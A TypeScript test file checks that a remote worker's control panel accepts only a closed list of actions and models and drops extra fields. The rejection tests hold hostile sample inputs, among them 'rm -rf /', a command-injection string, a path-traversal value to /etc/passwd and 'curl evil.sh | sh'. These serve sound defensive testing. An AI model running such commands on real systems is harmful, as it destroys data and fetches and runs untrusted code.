import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import {
  ACTION_LABEL,
  KNOWN_MODELS,
  WORKER_ACTIONS,
  describeWorkerState,
  isKnownModel,
  isStaleCommand,
  isWorkerAction,
  validateDesired,
} from './worker-control';

/**
 * These tests exist for one reason: the worker machine holds a Firestore
 * admin service account, so "the team can control it from the app" must never
 * widen into "the team can run things on it". The closed lists below are the
 * whole of that guarantee.
 */

describe('the closed list of actions', () => {
  it('accepts only what the worker has a handler for', () => {
    for (const action of WORKER_ACTIONS) assert.equal(isWorkerAction(action), true, action);
  });

  it('rejects anything else, including things that look like commands', () => {
    for (const value of [
      'rm -rf /',
      'restart; whoami',
      'RESTART',
      'exec',
      '',
      null,
      undefined,
      42,
      { action: 'restart' },
      ['restart'],
    ]) {
      assert.equal(isWorkerAction(value), false, JSON.stringify(value));
    }
  });

  it('describes every action it offers, so nothing appears as a bare verb', () => {
    for (const action of WORKER_ACTIONS) {
      assert.ok(ACTION_LABEL[action]?.label, `${action} has no label`);
      assert.ok(ACTION_LABEL[action]?.detail, `${action} has no explanation`);
    }
  });

  it('asks before the two that lose work', () => {
    assert.ok(ACTION_LABEL.update.confirm);
    assert.ok(ACTION_LABEL.clear_cache.confirm);
    assert.equal(ACTION_LABEL.restart.confirm, undefined);
    assert.equal(ACTION_LABEL.doctor.confirm, undefined);
  });
});

describe('the closed list of models', () => {
  it('accepts the models it ships with', () => {
    for (const model of KNOWN_MODELS) assert.equal(isKnownModel(model.id), true, model.id);
  });

  it('refuses an arbitrary string, which is the whole point', () => {
    // `model` reaches Ollama, so free text here would mean "fetch and run any
    // weights you like on the machine".
    for (const value of ['../../etc/passwd', 'someone/backdoored-model', 'qwen2.5vl', '', null, 7]) {
      assert.equal(isKnownModel(value), false, JSON.stringify(value));
    }
  });
});

describe('validateDesired', () => {
  it('passes a good pause', () => {
    assert.deepEqual(validateDesired({ paused: true }), { ok: true, value: { paused: true } });
  });

  it('passes a known model', () => {
    const result = validateDesired({ model: 'qwen2.5vl:32b' });
    assert.equal(result.ok, true);
    assert.equal(result.value.model, 'qwen2.5vl:32b');
  });

  it('refuses an unknown model and says which', () => {
    const result = validateDesired({ model: 'evil:latest' });
    assert.equal(result.ok, false);
    assert.match(result.reason ?? '', /evil:latest/);
  });

  it('refuses a non-boolean pause', () => {
    assert.equal(validateDesired({ paused: 'yes' as unknown as boolean }).ok, false);
  });

  it('drops anything it was not asked about, so no extra field can ride along', () => {
    const result = validateDesired({
      paused: true,
      model: 'gemma3:4b',
      shell: 'curl evil.sh | sh',
    } as never);
    assert.deepEqual(Object.keys(result.value).sort(), ['model', 'paused']);
  });

  it('returns an empty value when nothing was set', () => {
    assert.deepEqual(validateDesired({}), { ok: true, value: {} });
  });
});

describe('stale commands', () => {
  const now = Date.parse('2026-09-22T12:00:00Z');

  it('calls a pending command stale once the machine has clearly missed it', () => {
    assert.equal(isStaleCommand({ status: 'pending', createdAt: '2026-09-22T11:45:00Z' }, now), true);
    assert.equal(isStaleCommand({ status: 'pending', createdAt: '2026-09-22T11:55:00Z' }, now), false);
  });

  it('never calls a finished command stale', () => {
    assert.equal(isStaleCommand({ status: 'done', createdAt: '2026-09-01T00:00:00Z' }, now), false);
    assert.equal(isStaleCommand({ status: 'running', createdAt: '2026-09-01T00:00:00Z' }, now), false);
  });
});

describe('what the panel says', () => {
  it('leads with offline, because nothing else matters then', () => {
    const state = describeWorkerState({ online: false, paused: true, busyWith: 'Measuring' });
    assert.deepEqual(state, { label: 'Offline', tone: 'grey' });
  });

  it('shows paused ahead of idle', () => {
    assert.equal(describeWorkerState({ online: true, paused: true }).label, 'Paused');
  });

  it('shows what it is doing when it is doing something', () => {
    assert.equal(describeWorkerState({ online: true, busyWith: 'Measuring page 3' }).label, 'Measuring page 3');
  });

  it('says it is waiting rather than saying nothing', () => {
    assert.match(describeWorkerState({ online: true }).label, /waiting/i);
  });
});
